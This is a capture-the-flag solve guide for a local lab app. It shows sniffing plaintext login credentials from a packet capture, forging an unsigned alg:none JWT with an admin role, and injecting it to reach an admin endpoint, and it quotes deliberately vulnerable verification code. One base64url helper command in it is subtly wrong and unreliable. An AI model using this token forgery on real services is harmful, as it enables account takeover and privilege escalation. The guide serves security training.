```markdown
# Stateside Intercept — Detailed Player's Solve Guide

> *POV: CTF player walking through every keystroke and click*

**Flag format:** `DAKSHH{...}`  
**Final flag:** `DAKSHH{stateside_man_in_the_middle}`

---

## Step 1: Extract & Inspect Files (30 seconds)

```bash
unzip 3_stateside_intercept.zip
cd 3_stateside_intercept/
ls -la
```

**Output:**
```
├── app/
├── traffic_capture.pcap      # Wireshark time
├── docker-compose.yml
└── writeup.md
```

**Player decision:** PCAP first. 90% of web challenges hide creds in traffic.

---

## Step 2: Wireshark Deep Dive (2 minutes)

```bash
wireshark traffic_capture.pcap &
```

### 2.1 Apply Filters
**Filter bar:** `http.request.method == "POST"`
- Hit Enter
- See 1-2 POST requests

### 2.2 Expand HTTP Packet
**Click the POST packet** → Follow → **TCP Stream**

**Raw request:**
```
POST /api/login HTTP/1.1
Host: stateside.local
Content-Type: application/x-www-form-urlencoded

username=elliot&password=mrrobot
```

### 2.3 Export Objects (Bonus)
**File → Export Objects → HTTP** → Save any files if present.

**Creds captured:**
```
username: elliot
password: mrrobot
```

**Player note:** Plain HTTP = instant win.

---

## Step 3: Launch Application (1 minute)

```bash
docker-compose up --build
```

**Terminal output:**
```
app_1  | Server running on port 3000
```

**Browser:** `http://localhost:3000`

---

## Step 4: Authenticate (30 seconds)

**Form inputs:**
```
Username: elliot
Password: mrrobot
```

**Click Login** → Redirect to `/dashboard`

**UI shows:** User dashboard, Admin button (grayed/disabled)

---

## Step 5: Token Extraction (45 seconds)

**DevTools:** F12 → **Application tab** → **Local Storage** → `http://localhost:3000`

**Find:** `stateside_token`
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZWxsaW90Iiwicm9sZSI6InVzZXIifQ.signaturehere
```

**Copy full token** to clipboard.

---

## Step 6: JWT Analysis (1 minute)

**Open:** https://jwt.io

**Paste token** → **Decoded sections appear:**

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "user": "elliot",
  "role": "user"    ← Target for escalation
}
```

**Player insight:** Need `"role": "admin"`. Check alg vuln next.

---

## Step 7: Source Code Recon (Optional, 1 minute)

```bash
cd app/
grep -r "alg" . --include="*.js"
```

**Finds:** Server accepts `alg: "none"`

**Or check:** `app/server.js` → JWT verification logic

```javascript
// BAD CODE - accepts alg:none
jwt.verify(token, null, { algorithms: ['HS256', 'none'] });
```

---

## Step 8: JWT Forge (90 seconds)

### 8.1 New Header
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Base64URL encode:** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

*How?* jwt.io encoder or:
```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d "=+/" | tr "/+" "_-"
```

### 8.2 New Payload
```json
{
  "user": "elliot",
  "role": "admin"
}
```

**Base64URL:** `eyJ1c2VyIjoiZWxsaW90Iiwicm9sZSI6ImFkbWluIn0`

### 8.3 Construct Token
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZWxsaW90Iiwicm9sZSI6ImFkbWluIn0.
```
**Note the trailing `.` (empty signature)**

**Verify on jwt.io:** Shows valid header/payload, no signature.

---

## Step 9: Token Injection (30 seconds)

**DevTools → Console:**
```javascript
localStorage.setItem(
  "stateside_token", 
  "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZWxsaW90Iiwicm9sZSI6ImFkbWluIn0."
);
localStorage.getItem("stateside_token");
```

**Output:** Your forged token.

**Hard refresh:** Ctrl+Shift+R

---

## Step 10: Admin Access (15 seconds)

**Admin button now active** → Click it.

**Or manual:** DevTools → Network → 
```
GET /api/admin
Authorization: Bearer [your_token]
```

**Response:**
```json
{
  "success": true,
  "flag": "DAKSHH{stateside_man_in_the_middle}"
}
```

---

## 🏆 Timeline Breakdown
```
Total time: 8-10 minutes (first solve)
Speedrun: 2 minutes (experienced player)
```

## ⚡ Pro Tips
1. **tshark one-liner** for creds:
```bash
tshark -r traffic_capture.pcap -Y "http.request.method==POST" -T fields -e http.request.uri -e http.request.full_uri -e http.file_data | grep login
```

2. **Browser console JWT tester:**
```javascript
atob("eyJ1c2VyIjoiZWxsaW90Iiwicm9sZSI6ImFkbWluIn0=")
```

3. **Check for multiple PCAPs** — sometimes creds + tokens both exposed.

## 🛡️ Vulns Chained
1. **HTTP MITM** → Credential theft
2. **JWT alg: none** → Privilege escalation

**Skills practiced:** Wireshark mastery, JWT attacks, Docker CTF workflow.
```
